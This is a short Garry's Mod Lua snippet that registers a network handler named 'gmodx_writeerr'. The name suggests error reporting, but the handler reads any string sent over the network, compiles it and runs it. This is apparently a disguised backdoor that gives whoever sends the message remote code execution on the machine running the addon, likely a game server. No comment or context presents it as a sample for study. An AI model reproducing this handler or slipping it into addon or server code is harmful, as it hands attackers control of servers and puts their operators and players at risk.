net.Receive("gmodx_writeerr", function()
    local str2 = net.ReadString()
    local status = CompileString(str2, "TEST")
    if status ~= nil then pcall(CompileString(str2 ~= nil and str2, "Console")) end
end)